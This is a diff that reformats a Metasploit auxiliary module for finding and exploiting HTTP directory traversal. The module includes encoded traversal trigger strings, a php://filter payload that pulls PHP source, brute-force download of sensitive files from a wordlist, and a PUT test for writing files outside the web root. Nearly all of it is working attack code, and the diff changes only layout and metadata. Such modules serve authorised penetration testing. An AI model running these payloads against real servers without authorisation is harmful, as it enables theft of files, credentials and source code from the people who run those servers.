@@ -14,48 +14,53 @@ class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::WmapScanUniqueQuery
 
-
   def initialize(info = {})
-    super(update_info(info,
-      'Name'           => 'Generic HTTP Directory Traversal Utility',
-      'Description'    => %q{
+    super(
+      update_info(
+        info,
+        'Name' => 'Generic HTTP Directory Traversal Utility',
+        'Description' => %q{
           This module allows you to test if a web server (or web application) is
-        vulnerable to directory traversal with three different actions.
+          vulnerable to directory traversal with three different actions.
 
           The 'CHECK' action (default) is used to automatically (or manually) find if
-        directory traversal exists in the web server, and then return the path that
-        triggers the vulnerability.  The 'DOWNLOAD' action shares the same ability as
-        'CHECK', but will take advantage of the found trigger to download files based on
-        a 'FILELIST' of your choosing.  The 'PHPSOURCE' action can be used to download
-        source against PHP applications.  The 'WRITABLE' action can be used to determine
-        if the trigger can be used to write files outside the www directory.
+          directory traversal exists in the web server, and then return the path that
+          triggers the vulnerability.  The 'DOWNLOAD' action shares the same ability as
+          'CHECK', but will take advantage of the found trigger to download files based on
+          a 'FILELIST' of your choosing.  The 'PHPSOURCE' action can be used to download
+          source against PHP applications.  The 'WRITABLE' action can be used to determine
+          if the trigger can be used to write files outside the www directory.
 
           To use the 'COOKIE' option, set your value like so: "name=value".
-      },
-      'Author'         =>
-        [
+        },
+        'Author' => [
           'Ewerson Guimaraes(Crash) <crash[at]dclabs.com.br>',
           'Michael Messner <devnull[at]s3cur1ty.de>',
           'et <et[at]cyberspace.org>',
           'sinn3r'
         ],
-      'License'        => MSF_LICENSE,
-      'Actions'        =>
-        [
-          ['CHECK',    'Description' => 'Check for basic directory traversal'],
+        'License' => MSF_LICENSE,
+        'Actions' => [
+          ['CHECK', 'Description' => 'Check for basic directory traversal'],
           ['WRITABLE', 'Description' => 'Check if a traversal bug allows us to write anywhere'],
           ['DOWNLOAD', 'Description' => 'Attempt to download files after brute forcing a trigger'],
           ['PHPSOURCE', 'Description' => 'Attempt to retrieve php source code files']
         ],
-      'DefaultAction'  => 'CHECK'
-    ))
+        'DefaultAction' => 'CHECK',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
 
     register_options(
       [
-        OptEnum.new('METHOD',    [true, 'HTTP Request Method', 'GET', ['GET', 'POST', 'HEAD', 'PUT']]),
-        OptString.new('PATH',    [true, 'Vulnerable path. Ex: /foo/index.php?pg=', '/']),
-        OptString.new('DATA',    [false,'HTTP body data', '']),
-        OptInt.new('DEPTH',      [true, 'Traversal depth', 5]),
+        OptEnum.new('METHOD', [true, 'HTTP Request Method', 'GET', ['GET', 'POST', 'HEAD', 'PUT']]),
+        OptString.new('PATH', [true, 'Vulnerable path. Ex: /foo/index.php?pg=', '/']),
+        OptString.new('DATA', [false, 'HTTP body data', '']),
+        OptInt.new('DEPTH', [true, 'Traversal depth', 5]),
         OptRegexp.new('PATTERN', [true, 'Regexp pattern to determine directory traversal', '^HTTP/\\d\\.\\d 200']),
         OptPath.new(
           'FILELIST',
@@ -63,18 +68,20 @@ class MetasploitModule < Msf::Auxiliary
             true,
             'Wordlist file to brute force',
             File.join(Msf::Config.install_root, 'data', 'wordlists', 'sensitive_files.txt')
-          ])
-      ])
+          ]
+        )
+      ]
+    )
 
     register_advanced_options(
       [
         # We favor automatic
-        OptString.new('TRIGGER',   [false,'Trigger string. Ex: ../', '']),
-        OptString.new('FILE',      [false, 'Default file to read for the fuzzing stage', '']),
-        OptString.new('COOKIE',    [false, 'Cookie value to use when sending the requests', ''])
-      ])
+        OptString.new('TRIGGER', [false, 'Trigger string. Ex: ../', '']),
+        OptString.new('FILE', [false, 'Default file to read for the fuzzing stage', '']),
+        OptString.new('COOKIE', [false, 'Cookie value to use when sending the requests', ''])
+      ]
+    )
   end
-
 
   # Avoids writing to datastore['METHOD'] directly
   def http_method
@@ -102,7 +109,7 @@ class MetasploitModule < Msf::Auxiliary
     triggers =
       [
         "../", ".../", "..\\", ".\\..\\", "..///", ".\\./", ".//..//",
-        ".%2e./", "%2e%2e/", "..%5c", "..%2f","..%c0%af.."
+        ".%2e./", "%2e%2e/", "..%5c", "..%2f", "..%c0%af.."
       ]
 
     # Initialize the default file(s) we should try to read during fuzzing
@@ -163,10 +170,10 @@ class MetasploitModule < Msf::Auxiliary
       this_path = uri
     end
 
-    req['method']     = http_method
-    req['uri']        = this_path
-    req['headers']    = {'Cookie'=>datastore['COOKIE']} if not datastore['COOKIE'].empty?
-    req['data']       = data if not data.empty?
+    req['method'] = http_method
+    req['uri'] = this_path
+    req['headers'] = { 'Cookie' => datastore['COOKIE'] } if not datastore['COOKIE'].empty?
+    req['data'] = data if not data.empty?
     req['authorization'] = basic_auth(datastore['HttpUsername'], datastore['HttpPassword'])
 
     return req
@@ -216,17 +223,17 @@ class MetasploitModule < Msf::Auxiliary
       print_good("Directory traversal found: #{trigger}")
 
       report_web_vuln({
-        :host     => rhost,
-        :port     => rport,
-        :vhost    => datastore['VHOST'],
-        :path     => uri,
-        :params   => normalize_uri(datastore['PATH']),
-        :pname    => trigger,
-        :risk     => 3,
-        :proof    => trigger,
-        :name     => self.fullname,
+        :host => rhost,
+        :port => rport,
+        :vhost => datastore['VHOST'],
+        :path => uri,
+        :params => normalize_uri(datastore['PATH']),
+        :pname => trigger,
+        :risk => 3,
+        :proof => trigger,
+        :name => self.fullname,
         :category => "web",
-        :method   => http_method
+        :method => http_method
       })
 
     else
@@ -241,7 +248,7 @@ class MetasploitModule < Msf::Auxiliary
     counter = 0
     files.each_line do |f|
       # Our trigger already puts us in '/', so our filename doesn't need to begin with that
-      f = f[1,f.length] if f =~ /^\//
+      f = f[1, f.length] if f =~ /^\//
 
       req = ini_request(uri = (normalize_uri(datastore['PATH']) + trigger + f).chop)
       res = send_request_cgi(req, 25)
@@ -254,14 +261,13 @@ class MetasploitModule < Msf::Auxiliary
       if res.to_s =~ datastore['PATTERN']
         # We assume the string followed by the last '/' is our file name
         fname = f.split("/")[-1].chop
-        loot = store_loot("lfi.data","text/plain",rhost, res.body,fname)
+        loot = store_loot("lfi.data", "text/plain", rhost, res.body, fname)
         print_good("File #{fname} downloaded to: #{loot}")
         counter += 1
       end
     end
     print_status("#{counter.to_s} file(s) downloaded")
   end
-
 
   #
   # Action 'PHPSOURCE': Used to grab the php source code
@@ -270,7 +276,7 @@ class MetasploitModule < Msf::Auxiliary
     counter = 0
     files.each_line do |f|
       # Our trigger already puts us in '/', so our filename doesn't need to begin with that
-      f = f[1,f.length] if f =~ /^\//
+      f = f[1, f.length] if f =~ /^\//
 
       req = ini_request(uri = (normalize_uri(datastore['PATH']) + "php://filter/read=convert.base64-encode/resource=" + f).chop)
       res = send_request_cgi(req, 25)
@@ -281,13 +287,12 @@ class MetasploitModule < Msf::Auxiliary
 
       # We assume the string followed by the last '/' is our file name
       fname = f.split("/")[-1].chop
-      loot = store_loot("php.data","text/plain",rhost,Rex::Text.decode_base64(res.body),fname)
+      loot = store_loot("php.data", "text/plain", rhost, Rex::Text.decode_base64(res.body), fname)
       print_good("File #{fname} downloaded to: #{loot}")
       counter += 1
     end
     print_status("#{counter.to_s} source code file(s) downloaded")
   end
-
 
   #
   # Action 'WRITABLE': This method will attempt to write to a directory outside of www
@@ -295,7 +300,7 @@ class MetasploitModule < Msf::Auxiliary
   def is_writable(trigger)
     # Modify some registered options for the PUT method
     tmp_method = http_method
-    tmp_data   = data
+    tmp_data = data
     @http_method = 'PUT'
 
     if data.empty?
@@ -316,7 +321,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # Prepare request to read our file
     @http_method = 'GET'
-    @data   = tmp_data
+    @data = tmp_data
     req = ini_request(uri)
     vprint_status("Verifying upload...")
     res = send_request_cgi(req, 25)
@@ -337,7 +342,7 @@ class MetasploitModule < Msf::Auxiliary
   # This is used in the lfi_download() function
   #
   def load_filelist
-    File.open(datastore['FILELIST'], 'rb') {|f| f.read}
+    File.open(datastore['FILELIST'], 'rb') { |f| f.read }
   end
 
   def run_host(ip)
@@ -351,16 +356,19 @@ class MetasploitModule < Msf::Auxiliary
     if action.name == 'CHECK'
       trigger = ini_trigger
       return if trigger.nil?
+
       check(trigger)
 
     elsif action.name == 'WRITABLE'
       trigger = ini_trigger
       return if trigger.nil?
+
       is_writable(trigger)
 
     elsif action.name == 'PHPSOURCE'
       trigger = ini_trigger
       return if trigger.nil?
+
       files = load_filelist
       php_download(files)
 
